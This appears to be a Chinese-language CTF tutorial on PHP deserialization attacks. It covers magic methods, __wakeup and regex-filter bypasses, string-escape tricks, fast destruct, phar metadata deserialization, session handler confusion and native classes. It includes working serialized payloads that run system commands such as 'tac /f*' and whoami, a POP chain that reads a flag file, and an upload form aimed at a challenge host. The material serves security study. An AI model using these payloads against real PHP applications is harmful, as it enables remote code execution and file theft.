&lt;?phpclass test&#123;	public $username;	public $password;	function __construct($username,$password)&#123;		echo &quot;__construct\n&quot;;        $this-&gt;username = $username;        $this-&gt;password = $password;	&#125;	function __sleep()&#123;		echo &quot;__sleep\n&quot;;		return [username,password]; //需要返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误	&#125;	function __wakeup()&#123;		echo &quot;__wakeup\n&quot;;		$this-&gt;username = &#x27;user&#x27;;	&#125;&#125;$a = new test(&#x27;admin&#x27;,&#x27;admin888&#x27;);$data = serialize($a);echo $data.&quot;\n&quot;;echo &quot;-----------------------------\n&quot;;var_dump(unserialize($data));

运行结果
__construct__sleepO:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;admin888&quot;;&#125;-----------------------------__wakeupclass test#2 (2) &#123;  public $username =&gt;  string(4) &quot;user&quot;  public $password =&gt;  string(8) &quot;admin888&quot;&#125;

__call &amp; __callstatic__call：对象执行类不存在的方法时会自动调用__call方法__callstatic：直接执行类不存在的方法时会自动调用__callstatic方法
&lt;?phpclass test&#123;	public $username;	public $password;	function __call($method,$args)&#123;		echo &#x27;不存在&#x27;.$method.&#x27;方法(__call)&#x27;.&#x27;&lt;br&gt;&#x27;;	&#125;		function __callstatic($method,$args)&#123;		echo &#x27;不存在&#x27;.$method.&#x27;方法(__callstatic)&#x27;.&#x27;&lt;br&gt;&#x27;;	&#125;&#125;$a = new test();$a-&gt;lewiserii();test::lewiserii();

运行结果
不存在lewiserii方法(__call)不存在lewiserii方法(__callstatic)

__get &amp; __set__get：对不可访问属性或不存在属性进行 访问引用时自动调用__set：对不可访问属性或不存在属性进行 写入时自动调用
&lt;?phpclass test&#123;	public $username=&#x27;admin&#x27;;	private $password=&#x27;admin888&#x27;;	function __get($name)&#123;		echo &quot;__get\n&quot;;	&#125;	function __set($name,$value)&#123;		echo &quot;__set\n&quot;;	&#125;&#125;$a = new test();$a-&gt;password;$a-&gt;password=&#x27;123456&#x27;;

运行结果
__get__set



__isset &amp; __unset__isset：在不可访问的属性上使用inset()时触发__unset：在不可访问的属性上使用unset()时触发
&lt;?phpclass test&#123;	public $username=&#x27;admin&#x27;;	private $password=&#x27;admin888&#x27;;	function __isset($name)&#123;		echo &quot;__isset\n&quot;;	&#125;	function __unset($name)&#123;		echo &quot;__unset\n&quot;;	&#125;&#125;$a = new test();isset($a-&gt;password);unset($a-&gt;psd);

运行结果
__isset__unset

__tostring__toString()：类的实例和字符串拼接或者作为字符串引用时会自动调用
&lt;?phpclass test&#123;	public $username=&#x27;admin&#x27;;	private $password=&#x27;admin888&#x27;;	function __tostring()&#123;		return &quot;tostring&quot;;	&#125;&#125;$a = new test();echo $a;

运行结果
tostring



__invoke__invoke()：将对象当作函数来使用时调用此方法
&lt;?phpclass test&#123;	public $username=&#x27;admin&#x27;;	private $password=&#x27;admin888&#x27;;	function __invoke()&#123;		echo &quot;__invoke&quot;;	&#125;&#125;$a = new test();$a();

运行结果
__invoke


反序列化绕过的几种方法绕过__wakeupCVE-2016-7124
利用条件：PHP5 &lt; 5.6.25​PHP7 &lt; 7.0.10

利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
例子：
&lt;?phpclass test&#123;    public $a=&#x27;test&#x27;;    public function __wakeup()&#123;        $this-&gt;a=&#x27;aaa&#x27;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a;    &#125;&#125;//$v = new test();//echo serialize($v);//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;test?&gt;

当执行unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);时会返回aaa，在修改对象属性个数的值，执行unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);会返回test
利用反序列化字符串报错利用一个包含__destruct方法的类触发魔术方法可绕过__wakeup方法
例子
&lt;?phpclass D &#123;    public function __get($name) &#123;        echo &quot;D::__get($name)\n&quot;;    &#125;    public function __destruct() &#123;        echo &quot;D::__destruct\n&quot;;    &#125;    public function __wakeup() &#123;        echo &quot;D::__wakeup\n&quot;;    &#125;&#125;class C &#123;    public function __destruct() &#123;        echo &quot;C::__destruct\n&quot;;        $this-&gt;c-&gt;b;    &#125;&#125;unserialize(&#x27;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;;N;&#125;&#x27;);

原本应该是O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;&#125;调用顺序是
D::__wakeupC::__destructD::__get(b)D::__destruct

添加了一个;N;(反序列化末尾加上;任意字符;)的错误结构后调用顺序就变成了
C::__destructD::__get(b)D::__wakeupD::__destruct

来自Article_kelp师傅的原理解释，orz：
使用C代替Oa - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - unicode string

例子
&lt;?php//https://3v4l.org/YAje0//https://bugs.php.net/bug.php?id=81151class E  &#123;    public function __construct()&#123;    &#125;    public function __destruct()&#123;        echo &quot;destruct&quot;;    &#125;    public function __wakeup()&#123;        echo &quot;wake up&quot;;    &#125;&#125;var_dump(unserialize(&#x27;C:1:&quot;E&quot;:0:&#123;&#125;&#x27;));

比较鸡肋，只能执行construct()和destruct()函数，无法添加任何内容
但是在特定的PHP版本下，可以使用一些内置类来重新包装实现绕过
ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize

例如ctfshow的2023愚人杯[easy_php]
&lt;?phpclass ctfshow &#123;    public $ctfshow;    public function __wakeup()&#123;        die(&quot;not allowed!&quot;);    &#125;    public function __destruct()&#123;        echo &quot;OK&quot;;        system($this-&gt;ctfshow);    &#125;&#125;$a= new ctfshow();$a-&gt;ctfshow= &quot;cat /f1agaaa&quot;;//$b=new SplObjectStorage();//$b-&gt;test=$a;//echo serialize($b);//C:16:&quot;SplObjectStorage&quot;:77:&#123;x:i:0;m:a:1:&#123;s:4:&quot;test&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;&#125;&#125;//$b=new ArrayObject($a);//echo serialize($b);//C:11:&quot;ArrayObject&quot;:67:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;;m:a:0:&#123;&#125;&#125;//$b=new ArrayIterator($a);//echo serialize($b);//C:13:&quot;ArrayIterator&quot;:67:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;;m:a:0:&#123;&#125;&#125;//$b=new RecursiveArrayIterator($a);//echo serialize($b);//C:22:&quot;RecursiveArrayIterator&quot;:67:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;;m:a:0:&#123;&#125;&#125;//$b=new SplDoublyLinkedList();//$b-&gt;push($a);//echo serialize($b);//C:19:&quot;SplDoublyLinkedList&quot;:57:&#123;i:0;:O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;&#125;//$b=new SplQueue();//$b-&gt;push($a);//echo serialize($b);//C:8:&quot;SplQueue&quot;:57:&#123;i:4;:O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;&#125;//$b=new SplStack();//$b-&gt;push($a);//echo serialize($b);//C:8:&quot;SplStack&quot;:57:&#123;i:6;:O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;&#125;


不过有几个类在使用时要注意需要加入push方法
绕过正则检测’O’
利用条件：preg_match(‘&#x2F;^O:\d+&#x2F;i’,$data)

例题：
&lt;?phperror_reporting(0);highlight_file(__FILE__);class backdoor&#123;    public $name;    public function __destruct()&#123;        eval($this-&gt;name);    &#125;&#125;$data = $_POST[&#x27;data&#x27;];if (preg_match(&#x27;/^O:\d+/i&#x27;,$data))&#123;    die(&quot;object not allow unserialize&quot;);&#125;


利用方式1：当在代码中使用类似preg_match(&#39;/^O:\d+/i&#39;,$data)的正则语句来匹配是否是对象字符串开头的时候，可以使用+绕过
O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;O:+8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;
要注意在url里传参时+要编码为%2B
利用方式2：使用array()绕过
&lt;?phpclass backdoor&#123;    public $name=&quot;system(&#x27;tac /f*&#x27;);&quot;;&#125;$a = new backdoor();echo serialize(array($a));//a:1:&#123;i:0;O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#x27;tac /f*&#x27;);&quot;;&#125;&#125;?&gt;

检测’}’有时候会遇到另一种正则，比如/\&#125;$/，会匹配最后一个&#125;
反序列化字符串末尾的&#125;&#125;&#125;&#125;是可以全部删掉的，没有影响
比如a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#125;
变成a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;
甚至在末尾填充字符a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;aaaaaaaaaa
均能正常解析
检测数字可以用字符i、d绕过
&lt;?php//https://3v4l.org/SJm2g// echo serialize(0);echo unserialize(&#x27;i:-1;&#x27;);echo &quot;\n&quot;;echo unserialize(&#x27;i:+1;&#x27;);echo &quot;\n&quot;;echo unserialize(&#x27;d:-1.1;&#x27;);echo &quot;\n&quot;;echo unserialize(&#x27;d:+1.2;&#x27;);

引用绕过利用方式：当代码中存在类似$this-&gt;a===$this-&gt;b的比较时可以用&amp;，使$a永远与$b相等
例子：
&lt;?phpclass test&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;        $this-&gt;b = &amp;$this-&gt;a;    &#125;    public function  __destruct()&#123;        if($this-&gt;a===$this-&gt;b)&#123;            echo 666;        &#125;    &#125;&#125;$a = serialize(new test());?&gt;

$this-&gt;b = &amp;$this-&gt;a;表示$b变量指向的地址永远指向$a变量指向的地址
16进制绕过利用方式：当代码中存在关键词检测时，将表示字符类型的s改为大写来绕过检测
例子：
&lt;?phpclass test&#123;    public $username=&#x27;admin&#x27;;    public $password=&#x27;admin888&#x27;;&#125;echo serialize(new test());//O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;admin888&quot;;&#125;?&gt;

如果过滤了关键字admin，可以将其替换成O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;S:5:&quot;\61dmin&quot;;s:8:&quot;password&quot;;S:8:&quot;\61dmin888&quot;;&#125;
表示字符类型的s为大写时，就会被当成16进制解析
字符逃逸&lt;?phpclass test&#123;	public $a=&#x27;aaa&#x27;;	public $b=&#x27;bbb&#x27;;&#125;$v = new test();echo serialize($v);//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;?&gt;


由于php在进行反序列化时，是从左到右读取，读取多少取决于s后面的字符长度，且认为读到&#125;就结束了，&#125;后面的字符不会有影响
一般触发字符逃逸的条件是替换函数str_replace，使字符串长度改变，造成字符逃逸，读取到不一样的数据
过滤后字符变多&lt;?phpclass test&#123;	public $a=&#x27;aaa&#x27;;	public $b=&#x27;bbb&#x27;;&#125;function filter($str)&#123;    return str_replace(&quot;aaa&quot;,&quot;aaaa&quot;,$str);&#125;$v = new test();echo filter(serialize($v));//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;?&gt;

可以发现结果中的aaa被替换成了aaaa，但是长度值没变，还是3，这就导致多出了一个a，而且值是可控的，我们可以将这部分值变为 很多aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;， 很多aaa的具体个数取决于后面想要构造的字符串的长度，这里是21位，就用21组aaa，这样替换后会多出21个字符
&lt;?phpclass test&#123;	public $a=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&#x27;;	public $b=&#x27;bbb&#x27;;&#125;function filter($str)&#123;    return str_replace(&quot;aaa&quot;,&quot;aaaa&quot;,$str);&#125;$v = new test();echo filter(serialize($v));//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:84:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;?&gt;

$b的值成功被修改成了qaq
过滤后字符变少原理与过滤后字符变多大同小异，就是前面少了，导致后面的字符被吃掉，从而执行了我们后面的代码
&lt;?phpclass test&#123;	public $a=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;;	public $b=&#x27;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&#x27;;&#125;function filter($str)&#123;    return str_replace(&quot;aaa&quot;,&quot;aa&quot;,$str);&#125;$v = new test();echo filter(serialize($v));//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:48:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:21:&quot;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&quot;;&#125;?&gt;

主要注意闭合就行了，与sql注入类似
类属性不敏感对于PHP版本7.1+，对属性的类型不敏感
&lt;?phpclass test &#123;	private $hello=&quot;private&quot;;	function __destruct()&#123;		var_dump($this-&gt;hello);	&#125;&#125;unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:5:&quot;hello&quot;;s:6:&quot;public&quot;;&#125;&#x27;);//string(6) &quot;public&quot;

令public时得到的序列化字符串，在priviate或者protected修饰的时候反序列化，hello属性都能获得值
类名和方法名不区分大小写PHP特性：变量名区分大小写常量名区分大小写数组索引 (键名) 区分大小写函数名, 方法名, 类名不区分大小写魔术常量不区分大小写 (以双下划线开头和结尾的常量)NULL TRUE FALSE 不区分大小写强制类型转换不区分大小写 (在变量前面加上 (type))

常见用来绕过正则
如ctfshow的一道题目
&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-04 23:52:24# @Last Modified by:   h1xa# @Last Modified time: 2020-12-05 00:17:08# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);$cs = file_get_contents(&#x27;php://input&#x27;);class ctfshow&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    public function login()&#123;        return $this-&gt;username===$this-&gt;password;    &#125;    public function __toString()&#123;        return $this-&gt;username;    &#125;    public function __destruct()&#123;        global $flag;        echo $flag;    &#125;&#125;$ctfshowo=@unserialize($cs);if(preg_match(&#x27;/ctfshow/&#x27;, $cs))&#123;    throw new Exception(&quot;Error $ctfshowo&quot;,1);&#125;


fast destruct
通常发序列化的入口在__destruct()方法，如果在反序列化操作之后抛出了异常则会跳过__destruct()函数的执行。

例如这样一道题目
&lt;?phpclass Test&#123;    public $args;    public function __destruct()    &#123;        system($this-&gt;args);    &#125;&#125;$a = @unserialize($_GET[&#x27;args&#x27;]);throw new Exception(&quot;NoNoNo&quot;);

反序列化操作执行之后并没有立即执行__destruct()方法中的内容，而是抛出了异常导致__destruct()方法被跳过。但是我们可以修改序列化得到的字符串使得反序列化解析出错，导致__destruct()方法被提前执行。
正常情况下的序列化字符串应该是：
O:4:&quot;Test&quot;:1:&#123;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;
payload:
//去掉一个大括号O:4:&quot;Test&quot;:1:&#123;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;//结尾加入多余数据O:4:&quot;Test&quot;:1:&#123;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;123a&#125;


serialize(unserialize($x)) !&#x3D; $x正常来说一个合法的反序列化字符串，在反序列化之后再次序列化所得到的结果应是一致的

虽然在例子中没有AAA这个类，但是在反序列化 序列化过后得到的值依然为原来的值
var_dump的结果：
//class AAA&#123;//    public $a = &#x27;1&#x27;;//    public $b = &#x27;2&#x27;;//&#125;//$raw = &#x27;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;s:1:&quot;b&quot;;s:1:&quot;2&quot;;&#125;&#x27;;//echo var_dump(unserialize($raw));object(AAA)#1 (2) &#123;  [&quot;a&quot;]=&gt;  string(1) &quot;1&quot;  [&quot;b&quot;]=&gt;  string(1) &quot;2&quot;&#125;

//$raw = &#x27;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;s:1:&quot;b&quot;;s:1:&quot;2&quot;;&#125;&#x27;;//echo var_dump(unserialize($raw));object(__PHP_Incomplete_Class)#1 (3) &#123;  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;  string(3) &quot;AAA&quot;  [&quot;a&quot;]=&gt;  string(1) &quot;1&quot;  [&quot;b&quot;]=&gt;  string(1) &quot;2&quot;&#125;

var_dump后可以发现以下差异
1：所属类名称对象所属类的名称由 AAA 变为了 __PHP__Incomplete_Class2：__PHP_Incomplete_Class_Name 属性__PHP_Incomplete_Class 对象中多包含了一个 __PHP_Incomplete_Class_Name 属性

所以PHP在遇到不存在的类时，会把不存在的类转换成 __PHP_Incomplete_Class 这种特殊的类，并且将原始的类名存放在 __PHP_Incomplete_Class_Name 这个属性中。而 serialize() 在处理的时候会倒推回来，发现对象是 __PHP_Incomplete_Class 后，会序列化成 __PHP_Incomplete_Class_Name 的值为类名的类，同时将 __PHP_Incomplete_Class_Name 删除（属性个数减一）
所以可以手动构造一个包含__PHP__Incomplete_Class的序列化字符串，因为是我们手动构造的，所以__PHP_Incomplete_Class_Name值为空，serialize找不到后会跳过，但是属性个数减一的步骤不会跳过，所以构成了serialize(unserialize($x)) != $x


注意：若 __PHP_Incomplete_Class 对象中的属性个数为零，则 __PHP_Incomplete_Class 的序列化结果中的属性个数描述值也将为零

phar反序列化
众所周知，在利用反序列化漏洞的时候，一般是将序列化后的字符串传入unserialize()来利用。但是通过phar可以不依赖unserialize()直接进行反序列化操作

Phar是PHP的压缩文档，是PHP中类似于JAR的一种打包文件。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句。在PHP 5.3或更高版本中默认开启
phar结构由4部分组成
一：stub
stub的基本结构：xxx&lt;?php xxx;__HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。类似于Phar的文件头
二：manifest
phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里就是漏洞利用的关键点
三：contents
被压缩文件的内容
四：signature
签名，放在文件末尾
签证尾部的01代表md5加密，02代表sha1加密，04代表sha256加密，08代表sha512加密

一个最基本的例子
&lt;?phpclass Test &#123;&#125;$a = new Test();$phar = new Phar(&quot;test.phar&quot;);   //后缀名必须为phar$phar-&gt;startBuffering();  //开始缓冲Phar写操作$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);   //设置stub$phar-&gt;setMetadata($a);  //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); //停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘?&gt;


php一大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行反序列化受影响的函数如下
fileatimefilectimefile_existsfile_get_contentsfile_put_contentsfilefilegroupfopenfileinodefilemtimefileownerfilepermsis_diris_executableis_fileis_linkis_readableis_writableis_writeableparse_ini_filecopyunlinkstatreadfile

当我们修改文件的内容时，签名就会变得无效，这个时候需要重新计算签名
from hashlib import sha1with open(&#x27;test.phar&#x27;, &#x27;rb&#x27;) as file:    f = file.read()s = f[:-28] # 获取要签名的数据h = f[-8:] # 获取签名类型和GBMB标识newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)with open(&#x27;newtest.phar&#x27;, &#x27;wb&#x27;) as file:    file.write(newf) # 写入新文件



phar绕过上传限制&lt;?phpclass Test &#123;&#125;$a = new Test();$phar = new Phar(&quot;test.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //添加任意的文件头$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;


绕过头部phar:&#x2F;&#x2F;如果题目限制了phar://不能出现在头几个字符，可以用Bzip/Gzip协议绕过
例如
if (preg_match(&quot;/^php|^file|^phar|^dict|^zip/i&quot;,$filename)&#123;    die();&#125;

php://filter/read=convert.base64-encode/resource=phar://test.phar//即使用filter伪协议来进行绕过compress.bzip2://phar:///test.phar/test.txt//使用bzip2协议来进行绕过compress.zlib://phar:///home/sx/test.phar/test.txt//使用zlib协议进行绕过


绕过__HALT_COMPILER检测在前面介绍stub时提到过，PHP通过__HALT_COMPILER来识别Phar文件，那么为了防止Phar反序列化的出现，可能就会对这个进行过滤
例如
if (preg_match(&quot;/HALT_COMPILER/i&quot;,$Phar)&#123;    die();&#125;

绕过方法一：
将Phar文件的内容写到压缩包注释中，压缩为zip文件
&lt;?php$a = serialize($a);$zip = new ZipArchive();$res = $zip-&gt;open(&#x27;phar.zip&#x27;,ZipArchive::CREATE);$zip-&gt;addFromString(&#x27;flag.txt&#x27;, &#x27;flag is here&#x27;);$zip-&gt;setArchiveComment($a);$zip-&gt;close();?&gt;

绕过方法二：
将生成的Phar文件进行gzip压缩，压缩后同样也可以进行反序列化
gzip test.phar



session反序列化什么是session这里就不描述了，网上有很多文章可以参考
先了解下PHP session不同引擎的存储机制
PHP session的存储机制是由session.serialize_handler来定义引擎的，默认是以文件的方式存储，且存储的文件是由sess_sessionid来决定文件名的
session.serialize_handler定义的引擎共有三种：



处理器名称
存储格式



php
键名 + 竖线 + 经过serialize()函数序列化处理的值


php_binary
键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值


php_serialize
经过serialize()函数序列化处理的数组


当php和php_serialize这两个处理区混合起来使用，就会出现session反序列化漏洞。原因是php_serialize存储的反序列化字符可以引用|，如果这时候使用php处理器的格式取出$_SESSION的值，|会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞
$_SESSION变量可控例子
//1.php&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];var_dump($_SESSION);//2.php&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class test&#123;	public $name;	function __wakeup()&#123;		echo $this-&gt;name;	&#125;&#125;

先在1.php传入?session=lewiserii
session的内容，因为1.php页面用的是php_serialize引擎，所以是序列化处理的数组的形式

而2.php用的是php引擎，在可控点传入|+序列化字符串，然后再次访问2.php调用session值的时候会触发
传入?session=|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:9:&quot;lewiserii&quot;;&#125;后，文件中的值就变成了下图中的值

再次访问2.php，发现成功反序列化，修改了$name


总结：由于1.php是使用php_serialize引擎处理，因此只会把’|’当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。

$_SESSION变量不可控当$_SESSION不能直接控制时，可以借助PHP_SESSION_UPLOAD_PROGRESS来完成反序列化
关于PHP_SESSION_UPLOAD_PROGRESS的介绍可以参考我的另一篇文章session.upload_progress文件包含
这里用ctfshow的一道新春题的前半部分作例子
&lt;?phpinclude(&quot;class.php&quot;);error_reporting(0);highlight_file(__FILE__);ini_set(&quot;session.serialize_handler&quot;, &quot;php&quot;);session_start();if (isset($_GET[&#x27;phpinfo&#x27;]))&#123;    phpinfo();&#125;if (isset($_GET[&#x27;source&#x27;]))&#123;    highlight_file(&quot;class.php&quot;);&#125;$happy=new Happy();$happy();?&gt;

class.php
&lt;?php    class Happy &#123;        public $happy;        function __construct()&#123;                $this-&gt;happy=&quot;Happy_New_Year!!!&quot;;        &#125;        function __destruct()&#123;                $this-&gt;happy-&gt;happy;        &#125;        public function __call($funName, $arguments)&#123;                die($this-&gt;happy-&gt;$funName);        &#125;        public function __set($key,$value)        &#123;            $this-&gt;happy-&gt;$key = $value;        &#125;        public function __invoke()        &#123;            echo $this-&gt;happy;        &#125;    &#125;    class _New_&#123;        public $daniu;        public $robot;        public $notrobot;        private $_New_;        function __construct()&#123;                $this-&gt;daniu=&quot;I&#x27;m daniu.&quot;;                $this-&gt;robot=&quot;I&#x27;m robot.&quot;;                $this-&gt;notrobot=&quot;I&#x27;m not a robot.&quot;;        &#125;        public function __call($funName, $arguments)&#123;                echo $this-&gt;daniu.$funName.&quot;not exists!!!&quot;;        &#125;        public function __invoke()        &#123;            echo $this-&gt;daniu;            $this-&gt;daniu=$this-&gt;robot;            echo $this-&gt;daniu;        &#125;        public function __toString()        &#123;            $robot=$this-&gt;robot;            $this-&gt;daniu-&gt;$robot=$this-&gt;notrobot;            return (string)$this-&gt;daniu;        &#125;        public function __get($key)&#123;               echo $this-&gt;daniu.$key.&quot;not exists!!!&quot;;        &#125; &#125;    class Year&#123;        public $zodiac;         public function __invoke()        &#123;            echo &quot;happy &quot;.$this-&gt;zodiac.&quot; year!&quot;;        &#125;         function __construct()&#123;                $this-&gt;zodiac=&quot;Hu&quot;;        &#125;        public function __toString()        &#123;                $this-&gt;show();        &#125;        public function __set($key,$value)#3        &#123;            $this-&gt;$key = $value;        &#125;        public function show()&#123;            die(file_get_contents($this-&gt;zodiac));        &#125;        public function __wakeup()        &#123;            $this-&gt;zodiac = &#x27;hu&#x27;;        &#125;    &#125;?&gt;

先构造pop链O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:5:&quot;/f1ag&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;
看下phpinfo中关于session的信息，可以知道当前index.php用的是php引擎，其他页面默认用php_serialize引擎，且session.upload_progress.cleanup=Off，意味着php不会立即清空对应的session文件，就不用进行条件竞争

构造POST表单，提交传入序列化字符串
&lt;form action=&quot;http://dece2f58-5f4b-4bd0-904a-ac58efcf9623.challenges.ctfer.com:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;lewiserii&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;

因为要放到filename中的双引号中，所以这里要转义一下双引号，在拼接上|，注意一定要带上PHPSESSID


伪造PHP_SESSION_UPLOAD_PROGRESS的值时，值中一旦出现|，将会导致数据写入session文件失败，所以用filename

php原生类反序列化如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化
原生文件操作类可遍历目录类：
DirectoryIterator 类FilesystemIterator 类GlobIterator 类

FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。
GlobIterator 类与前两个类的作用与使用方法相似，但与上面略不同的是其行为类似于glob()，可以通过模式匹配来寻找文件路径。
